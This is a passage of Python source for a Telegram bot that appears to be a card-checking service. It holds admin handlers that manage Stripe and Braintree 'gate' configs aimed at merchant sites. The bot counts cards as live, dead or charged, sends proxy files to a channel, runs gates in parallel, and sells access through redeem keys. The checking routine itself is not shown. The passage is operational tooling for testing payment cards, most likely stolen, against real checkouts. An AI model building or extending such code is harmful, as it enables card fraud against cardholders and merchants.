                f"Current ID: <code>{display_id}</code>\n"
                f"Source: <code>{'Custom' if current else 'Default (env)'}</code>\n\n"
                "<b>Usage:</b>\n"
                "<code>/setchannel [chat_id]</code>\n"
                "<code>/setchannel reset</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        if args.strip().lower() == 'reset':
            set_custom_chat_id(None)
            env_id = TELEGRAM_CHAT_ID
            await message.reply(
                "<b>✅  CHANNEL RESET</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Reverted to default: <code>{env_id}</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        try:
            new_id = int(args.strip())
            set_custom_chat_id(new_id)
            await message.reply(
                "<b>✅  CHANNEL UPDATED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"New ID: <code>{new_id}</code>\n"
                "All output will be sent here.\n"
                "Use <code>/setchannel reset</code> to revert.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        except ValueError:
            await message.reply(
                "<b>❌  INVALID ID</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "Channel ID must be a number.\n"
                "Example: <code>/setchannel -1001234567890</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    @dp.message_handler(commands=['notify'])
    async def cmd_notify(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            settings = get_all_notify()
            live_icon = "🟢" if settings['live'] else "🔴"
            dec_icon = "🟢" if settings['decline'] else "🔴"
            err_icon = "🟢" if settings['errors'] else "🔴"
            pf_icon = "🟢" if settings.get('proxy_file', False) else "🔴"
            await message.reply(
                "<b>🔔  NOTIFY SETTINGS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{live_icon}  <b>Live / Charged</b>  ·  <code>{'ON' if settings['live'] else 'OFF'}</code>\n"
                f"{dec_icon}  <b>Declined / Dead</b>  ·  <code>{'ON' if settings['decline'] else 'OFF'}</code>\n"
                f"{err_icon}  <b>Errors</b>           ·  <code>{'ON' if settings['errors'] else 'OFF'}</code>\n"
                f"{pf_icon}  <b>Proxy File</b>        ·  <code>{'ON' if settings.get('proxy_file') else 'OFF'}</code>\n\n"
                "\n<b>USAGE</b>\n"
                "<code>/notify live on</code>\n"
                "<code>/notify decline off</code>\n"
                "<code>/notify errors on</code>\n"
                "<code>/notify proxy_file on</code>\n\n"
                "<code>/sendproxies</code> — Send proxies now\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        parts = args.strip().lower().split()
        if len(parts) != 2:
            await message.reply(
                "<b>❌  INVALID FORMAT</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<code>/notify [type] [on/off]</code>\n"
                "Types: <code>live</code> <code>decline</code> <code>errors</code> <code>proxy_file</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        ntype, toggle = parts[0], parts[1]
        if ntype not in ('live', 'decline', 'errors', 'proxy_file'):
            await message.reply(
                "<b>❌  UNKNOWN TYPE</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"'<code>{ntype}</code>' is not valid.\n"
                "Use: <code>live</code> <code>decline</code> <code>errors</code> <code>proxy_file</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        if toggle not in ('on', 'off'):
            await message.reply(
                "<b>❌  INVALID TOGGLE</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "Use <code>on</code> or <code>off</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        enabled = toggle == 'on'
        set_notify(ntype, enabled)
        icon = "🟢" if enabled else "🔴"
        label = ntype.upper()
        state = "ON" if enabled else "OFF"
        await message.reply(
            "<b>✅  NOTIFY UPDATED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{icon}  <b>{label}</b> reporting: <code>{state}</code>\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['sendproxies'])
    async def cmd_sendproxies(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Admin only.", parse_mode='HTML')
            return

        active_chat = get_active_chat_id()
        ok, msg = await _send_proxy_file_to_channel(active_chat)
        if ok:
            logger.info(f"Proxies sent to channel by {message.from_user.id}: {msg}")
        else:
            await message.reply(f"❌ {msg}", parse_mode='HTML')

    @dp.message_handler(commands=['configs'])
    async def cmd_configs(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        configs = get_all_configs()
        active_id = get_active_config_id()
        parallel = is_parallel_enabled()
        lines = []
        for cid, cfg in sorted(configs.items()):
            icon = "🟢" if cfg["enabled"] else "🔴"
            active = " ⬅️" if cid == active_id else ""
            s = cfg["stats"]
            gt = cfg.get("gate_type", "stripe")
            gt_label = gt.upper()
            st = cfg.get("settings", {})
            site = st.get('site_url', 'N/A')

            detail_lines = _fmt_gate_settings(st, gt, compact=True)
            detail = "\n".join(f"     {line}" for line in detail_lines.strip().split("\n"))

            lines.append(
                f"{icon}  <b>#{cid}</b> · {cfg['name']}{active}\n"
                f"     🛡 <code>{gt_label}</code> · 🌐 <code>{site[:30]}</code>\n"
                f"{detail}"
                f"     📊 C:<code>{s['checked']}</code> L:<code>{s['live']}</code> D:<code>{s['dead']}</code> 💰:<code>{s['charged']}</code>"
            )
        config_list = "\n\n".join(lines)

        p_icon = "🟢" if parallel else "🔴"
        p_label = "ON" if parallel else "OFF"
        p_btn_text = "🔀 Parallel OFF" if parallel else "🔀 Parallel ON"
        p_btn_data = "parallel_off" if parallel else "parallel_on"

        await message.reply(
            f"<b>⚙️  GATE CONFIGS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊  Total: <code>{len(configs)}/5</code>\n"
            f"{p_icon}  Parallel: <b>{p_label}</b>\n"
            f"⬅️  Active: <b>#{active_id}</b>\n\n"
            f"\n<b>CONFIGS</b>\n\n"
            f"{config_list}\n\n"
            f"\n<b>EDIT</b>\n"
            f"<code>/editconfig [id]</code> · Full details\n"
            f"<code>/setconfig [id] [key] [val]</code>\n"
            f"<code>/configon [id]</code> · <code>/configoff [id]</code>\n"
            f"<code>/switchconfig [id]</code>\n"
            f"<code>/newconfig [stripe|bt] [name]</code>\n"
            f"<code>/delconfig [id]</code>\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=p_btn_text, callback_data=p_btn_data)],
                [InlineKeyboardButton(text="🛡 Gate", callback_data="gate"),
                 InlineKeyboardButton(text="🎛 Panel", callback_data="panel")]
            ])
        )

    @dp.message_handler(commands=['newconfig'])
    async def cmd_newconfig(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args() or ""
        parts = args.strip().split(None, 1)
        gate_type = "stripe"
        name = ""
        if parts:
            first = parts[0].lower()
            if first in ("braintree", "bt"):
                gate_type = "braintree"
                name = parts[1] if len(parts) > 1 else ""
            elif first in ("stripe", "st"):
                gate_type = "stripe"
                name = parts[1] if len(parts) > 1 else ""
            else:
                name = args.strip()
        cid, msg = create_config(name.strip(), gate_type=gate_type)
        if cid is None:
            await message.reply(
                f"<b>❌  CANNOT CREATE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{msg}\n"
                f"Delete one first with /delconfig\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        cfg = get_config(cid)
        gt_label = gate_type.upper()
        await message.reply(
            f"<b>✅  CONFIG CREATED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🆔  Config <b>#{cid}</b>\n"
            f"📛  <code>{cfg['name']}</code>\n"
            f"🛡  Gate: <b>{gt_label}</b>\n"
            f"🔴  Disabled (use /configon {cid})\n\n"
            f"Setup with:\n"
            f"<code>/editconfig {cid}</code>\n"
            f"<code>/setconfig {cid} site [url]</code>\n"
            f"<code>/configon {cid}</code>\n\n"
            f"Tip: <code>/newconfig braintree [name]</code>\n"
            f"       <code>/newconfig stripe [name]</code>\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['dupconfig'])
    async def cmd_dupconfig(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or not args.strip().isdigit():
            await message.reply(
                "<b>📋  DUPLICATE CONFIG</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<code>/dupconfig [id]</code>\n"
                "Copies all settings from source.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        source_id = int(args.strip())
        cid, msg = duplicate_config(source_id)
        if cid is None:
            await message.reply(
                f"<b>❌  DUPLICATE FAILED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{msg}\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        cfg = get_config(cid)
        await message.reply(
            f"<b>✅  CONFIG DUPLICATED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📋  Source: <b>#{source_id}</b>\n"
            f"🆕  New: <b>#{cid}</b> · {cfg['name']}\n"
            f"🌐  <code>{cfg['settings'].get('site_url', 'N/A')[:35]}</code>\n"
            f"🔴  Disabled (use /configon {cid})\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['delconfig'])
    async def cmd_delconfig(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or not args.strip().isdigit():
            await message.reply(
                "<b>🗑  DELETE CONFIG</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<code>/delconfig [id]</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        cid = int(args.strip())
        ok, msg = delete_config(cid)
        if not ok:
            await message.reply(
                f"<b>❌  DELETE FAILED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{msg}\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        await message.reply(
            f"<b>✅  CONFIG DELETED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🗑  Config <b>#{cid}</b> removed\n"
            f"📊  Remaining: <code>{config_count()}/5</code>\n"
            f"⬅️  Active: <b>#{get_active_config_id()}</b>\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['switchconfig'])
    async def cmd_switchconfig(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or not args.strip().isdigit():
            await message.reply(
                f"<code>/switchconfig [id]</code> · Active: <b>#{get_active_config_id()}</b>",
                parse_mode='HTML'
            )
            return
        cid = int(args.strip())
        if set_active_config(cid):
            cfg = get_config(cid)
            await message.reply(
                f"<b>✅  CONFIG SWITCHED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⬅️  Active: <b>#{cid}</b> · {cfg['name']}\n"
                f"🌐  <code>{cfg['settings'].get('site_url', 'N/A')[:35]}</code>\n"
                f"{'🟢' if cfg['enabled'] else '🔴'}  {'Enabled' if cfg['enabled'] else 'Disabled'}\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(f"Config #{cid} not found. Use /configs")

    @dp.message_handler(commands=['configon'])
    async def cmd_configon(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or not args.strip().isdigit():
            await message.reply("  <code>/configon [id]</code> · Enable a config", parse_mode='HTML')
            return
        cid = int(args.strip())
        if enable_config(cid):
            cfg = get_config(cid)
            await message.reply(
                f"<b>🟢  CONFIG ENABLED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Config <b>#{cid}</b> · {cfg['name']}\n"
                f"Now active for checking.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(f"Config #{cid} not found. Use /configs")

    @dp.message_handler(commands=['configoff'])
    async def cmd_configoff(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or not args.strip().isdigit():
            await message.reply("  <code>/configoff [id]</code> · Disable a config", parse_mode='HTML')
            return
        cid = int(args.strip())
        if disable_config(cid):
            cfg = get_config(cid)
            await message.reply(
                f"<b>🔴  CONFIG DISABLED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Config <b>#{cid}</b> · {cfg['name']}\n"
                f"Paused from checking.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(f"Config #{cid} not found. Use /configs")

    @dp.message_handler(commands=['renameconfig'])
    async def cmd_renameconfig(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or ' ' not in args.strip():
            await message.reply("  <code>/renameconfig [id] [name]</code>", parse_mode='HTML')
            return
        parts = args.strip().split(None, 1)
        if not parts[0].isdigit():
            await message.reply("First argument must be config ID number.")
            return
        cid = int(parts[0])
        new_name = parts[1].strip() if len(parts) > 1 else ""
        if set_config_name(cid, new_name):
            await message.reply(
                f"<b>✅  CONFIG RENAMED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Config <b>#{cid}</b> → <code>{new_name}</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(f"Config #{cid} not found.")

    @dp.message_handler(commands=['parallel'])
    async def cmd_parallel(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args:
            enabled = is_parallel_enabled()
            p_icon = "🟢" if enabled else "🔴"
            p_label = "ON" if enabled else "OFF"
            en_configs = get_enabled_configs()
            await message.reply(
                f"<b>🔀  PARALLEL MODE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{p_icon}  Parallel: <b>{p_label}</b>\n"
                f"📊  Enabled configs: <code>{len(en_configs)}</code>\n"
                f"🔥  Max parallel: <code>5</code>\n\n"
                f"<code>/parallel on</code>  · Enable\n"
                f"<code>/parallel off</code> · Disable\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        toggle = args.strip().lower()
        if toggle == 'on':
            en = get_enabled_configs()
            if len(en) < 2:
                await message.reply(
                    "<b>⚠️  NEED MORE CONFIGS</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Enable at least 2 configs first.\n"
                    "Use /newconfig and /configon\n\n"
                    "<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
                return
            set_parallel_enabled(True)
            await message.reply(
                f"<b>🟢  PARALLEL ON</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔀  <code>{len(en)}</code> configs running parallel\n"
                f"All enabled configs will check\n"
                f"simultaneously per cycle.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        elif toggle == 'off':
            set_parallel_enabled(False)
            await message.reply(
                f"<b>🔴  PARALLEL OFF</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Single config mode active.\n"
                f"Only active config #{get_active_config_id()} runs.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply("Use <code>/parallel on</code> or <code>/parallel off</code>", parse_mode='HTML')

    @dp.message_handler(commands=['genkey'])
    async def cmd_genkey(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or not args.strip().isdigit():
            await message.reply(
                "<b>🔑  GENERATE KEY</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<code>/genkey [days]</code>\n"
                "Days: 1-30\n\n"
                "Generates a redeem key for\n"
                "users to access the bot.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        days = int(args.strip())
        key, msg = generate_redeem_key(days)
        if key is None:
            await message.reply(
                f"<b>❌  INVALID</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{msg}\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        from datetime import datetime
        expiry_date = datetime.fromtimestamp(int(time.time()) + (days * 86400)).strftime('%Y-%m-%d %H:%M')
        await message.reply(
            f"<b>🔑  KEY GENERATED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎫  <code>{key}</code>\n\n"
            f"⏱  Duration: <code>{days} day{'s' if days > 1 else ''}</code>\n"
            f"📅  Expires: <code>{expiry_date}</code>\n\n"
            f"Share this key with a user.\n"
            f"They use: <code>/redeem {key}</code>\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['keys'])
    async def cmd_keys(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        cleanup_expired_keys()
        all_keys = get_all_redeem_keys()
        if not all_keys:
            await message.reply(
                "<b>🔑  REDEEM KEYS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "No active keys.\n"
                "Use <code>/genkey [days]</code> to create.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        now = int(time.time())
        lines = []
        for k, v in all_keys.items():
            remaining = max(0, v["expiry"] - now)
            r_days = remaining // 86400
            r_hours = (remaining % 86400) // 3600
            status = "✅ Used" if v["used_by"] else "🟡 Unused"
            user_str = f" by <code>{v['used_by']}</code>" if v["used_by"] else ""
            lines.append(
                f"<code>{k}</code>\n"
                f"     {status}{user_str}\n"
                f"     ⏱ <code>{v['days']}d</code> · Left: <code>{r_days}d {r_hours}h</code>"
            )
        key_list = "\n\n".join(lines)
        await message.reply(
            f"<b>🔑  REDEEM KEYS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊  Total: <code>{len(all_keys)}</code>\n\n"
            f"{key_list}\n\n"
            f"\n<b>COMMANDS</b>\n"
            f"<code>/genkey [days]</code>  · Create\n"
            f"<code>/revokekey [key]</code> · Delete\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['revokekey'])
    async def cmd_revokekey(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args:
            await message.reply("  <code>/revokekey [key]</code>", parse_mode='HTML')
            return
        key = args.strip()
        if revoke_redeem_key(key):
            await message.reply(
                f"<b>✅  KEY REVOKED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🗑  <code>{key}</code>\n"
                f"Key has been deleted.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(
                f"<b>❌  KEY NOT FOUND</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{key}</code>\n"
                f"Use /keys to see active keys.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    @dp.message_handler(commands=['addadmin'])
    async def cmd_addadmin(message: Message):
        if not is_owner(message.from_user.id):
            await message.reply("🔒 Owner only.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args:
            await message.reply(
                "<code>/addadmin [id or @username]</code>",
                parse_mode='HTML'
            )
            return
        identifier = args.strip().split()[0]
        label = ' '.join(args.strip().split()[1:]) if len(args.strip().split()) > 1 else identifier
        ok, msg = add_admin(identifier, label)
        if ok:
            await message.reply(
                f"<b>✅  ADMIN ADDED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤  <code>{identifier}</code>\n"
                f"Full admin access granted.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(f"❌ {msg}", parse_mode='HTML')

    @dp.message_handler(commands=['removeadmin'])
    async def cmd_removeadmin(message: Message):
        if not is_owner(message.from_user.id):
            await message.reply("🔒 Owner only.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args:
            await message.reply(
                "<code>/removeadmin [id or @username]</code>",
                parse_mode='HTML'
            )
            return
        identifier = args.strip()
        if remove_admin(identifier):
            await message.reply(
                f"<b>✅  ADMIN REMOVED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🗑  <code>{identifier}</code>\n"
                f"Access revoked.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply("❌ Admin not found.", parse_mode='HTML')

    @dp.message_handler(commands=['admins'])
    async def cmd_admins(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        admins = get_all_admins()
        owner_list = ', '.join(ADMIN_IDS) if ADMIN_IDS else 'Not set'
        lines = f"  👑  Owner(s): <code>{owner_list}</code>\n"
        if admins:
            for uid, info in admins.items():
                label = info.get('label', uid)
                added = time.strftime('%b %d', time.localtime(info.get('added', 0)))
                lines += f"  👤  <code>{uid}</code> · {label} · {added}\n"
        else:
            lines += "  No extra admins added.\n"
        await message.reply(
            f"<b>👥  ADMIN LIST</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{lines}\n"
            f"<code>/addadmin [id]</code> · Add\n"
            f"<code>/removeadmin [id]</code> · Remove\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['redeem'])
    async def cmd_redeem(message: Message):
        args = message.get_args()
        if not args:
            await message.reply(
                "<b>🎫  REDEEM KEY</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<code>/redeem [key]</code>\n"
                "Enter your access key.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        key = args.strip()
        ok, result = redeem_key(key, message.from_user.id)
        if ok:
            days = result
            await message.reply(
                f"<b>✅  KEY REDEEMED!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Welcome, <b>{message.from_user.first_name}</b>!\n"
                f"⏱  Access: <code>{days} day{'s' if days > 1 else ''}</code>\n\n"
                f"You can now use all commands\n"
                f"except delete & on/off controls.\n"
                f"Type /help to see commands.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(
                f"<b>❌  REDEEM FAILED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{result}\n"
                f"Contact admin for a valid key.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    @dp.message_handler(commands=['editconfig'])
    async def cmd_editconfig(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or not args.strip().split()[0].isdigit():
            await message.reply(
                "<b>📝  EDIT CONFIG</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<code>/editconfig [id]</code>\n"
                "View full config details.\n\n"
                "<code>/setconfig [id] [key] [value]</code>\n"
                "Edit a specific setting.\n\n"
                "<code>/setupconfig [id] [url]</code>\n"
                "Quick setup from URL.\n\n"
                "<code>/fixconfig [id]</code>\n"
                "Run diagnostic + auto-fix.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        cid = int(args.strip().split()[0])
        cfg = get_config(cid)
        if not cfg:
            await message.reply(f"Config #{cid} not found. Use /configs")
            return
        s = cfg["settings"]
        st = cfg["stats"]
        gt = cfg.get("gate_type", "stripe")
        gt_label = gt.upper()
        site = s.get('site_url', 'Not set')
        status_icon = "🟢" if cfg["enabled"] else "🔴"
        status_text = "Enabled" if cfg["enabled"] else "Disabled"
        active_mark = " ⬅️ ACTIVE" if cid == get_active_config_id() else ""

        settings_block = f"\n<b>GATE SETTINGS ({gt_label})</b>\n" + _fmt_gate_settings(s, gt)
        if gt == "braintree":
            edit_block = (
                f"\n<b>EDIT</b>\n"
                f"<code>/setconfig {cid} site [url]</code>\n"
                f"<code>/setconfig {cid} cartpath [path]</code>\n"
                f"<code>/setconfig {cid} checkoutpath [path]</code>\n"
                f"<code>/setconfig {cid} paymethod [id]</code>\n"
                f"<code>/setconfig {cid} gatetype [stripe|braintree]</code>\n"
            )
        else:
            edit_block = (
                f"\n<b>🔧  REQUIRED</b>\n"
                f"<code>/setconfig {cid} site [url]</code>\n"
                f"<code>/setconfig {cid} path [path]</code>\n"
                f"\n<b>🤖  AUTO-DETECTED</b>\n"
                f"🔑 Key · 🏷 Account · 📋 Campaign\n"
                f"<i>/setupconfig {cid} [url] to auto-detect</i>\n"
                f"\n<b>💰  OPTIONAL</b>\n"
                f"<code>/setconfig {cid} amount [amt]</code>\n"
                f"<code>/setconfig {cid} randomamt [on|off]</code>\n"
                f"<code>/setconfig {cid} gatetype [stripe|braintree]</code>\n"
            )

        hit_rate = f"{(st['live'] / st['checked'] * 100):.1f}%" if st['checked'] > 0 else "0%"

        config_buttons = []
        if cfg["enabled"]:
            config_buttons.append([InlineKeyboardButton(text=f"🔴 Disable #{cid}", callback_data=f"cfgoff_{cid}")])
        else:
            config_buttons.append([InlineKeyboardButton(text=f"🟢 Enable #{cid}", callback_data=f"cfgon_{cid}")])
        if cid != get_active_config_id():
            config_buttons.append([InlineKeyboardButton(text=f"⬅️ Switch to #{cid}", callback_data=f"cfgswitch_{cid}")])
        config_buttons.append([
            InlineKeyboardButton(text="⚙️ Configs", callback_data="configs"),
            InlineKeyboardButton(text="🎛 Panel", callback_data="panel")
        ])

        await message.reply(
            f"<b>📝  CONFIG #{cid}</b>{active_mark}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📛  Name: <b>{cfg['name']}</b>\n"
            f"🛡  Gate: <b>{gt_label}</b>\n"
            f"{status_icon}  Status: <b>{status_text}</b>\n\n"
            f"{settings_block}\n"
            f"\n<b>STATS</b>\n"
            f"📋 Checked: <code>{st['checked']}</code> · Hit <code>{hit_rate}</code>\n"
            f"✅ Live: <code>{st['live']}</code>  ·  💰 Charged: <code>{st['charged']}</code>\n"
            f"❌ Dead: <code>{st['dead']}</code>  ·  ⚠️ Errors: <code>{st['errors']}</code>\n\n"
            f"{edit_block}\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(inline_keyboard=config_buttons)
        )

    @dp.message_handler(commands=['setconfig'])
    async def cmd_setconfig(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args:
            await message.reply(
                "<b>⚙️  SET CONFIG</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "\n<b>USAGE</b>\n"
                "<code>/setconfig [id] [key] [value]</code>\n\n"
                "\n<b>KEYS</b>\n"
                "site · path · amount\n"
                "key · account · campaign\n\n"
                "\n<b>EXAMPLE</b>\n"
                "<code>/setconfig 1 site https://example.com</code>\n"
                "<code>/setconfig 2 amount 5.00</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        parts = args.strip().split(None, 2)
        if len(parts) < 3 or not parts[0].isdigit():
            await message.reply(
                "<code>/setconfig [id] [key] [value]</code>\n"
                "Example: <code>/setconfig 1 site https://example.com</code>",
                parse_mode='HTML'
            )
            return
        cid = int(parts[0])
        setting_key = parts[1].lower()
        setting_value = parts[2].strip()
        cfg = get_config(cid)
        if not cfg:
            await message.reply(f"Config #{cid} not found. Use /configs")
            return
        if setting_key == 'gatetype':
            if setting_value.lower() in ('stripe', 'braintree', 'st', 'bt'):
                new_gt = 'braintree' if setting_value.lower() in ('braintree', 'bt') else 'stripe'
                set_config_gate_type(cid, new_gt)
                await message.reply(
                    f"<b>✅  CONFIG #{cid} GATE TYPE</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🛡  Gate changed to: <b>{new_gt.upper()}</b>\n"
                    f"⚠️  Settings reset to defaults.\n"
                    f"Use <code>/editconfig {cid}</code> to configure.\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
                return
            else:
                await message.reply("❌ Valid gate types: <code>stripe</code>, <code>braintree</code>", parse_mode='HTML')
                return

        cfg_gt = cfg.get("gate_type", "stripe")

        if setting_key == 'randomamt' and cfg_gt == 'stripe':
            enabled = setting_value.lower() in ('on', 'true', '1', 'yes')
            set_config_setting(cid, "random_amount", enabled)
            if cid == get_active_config_id():
                set_gate_setting("stripe", "random_amount", enabled)
            icon = "🟢 ON" if enabled else "🔴 OFF"
            s = get_config(cid)["settings"]
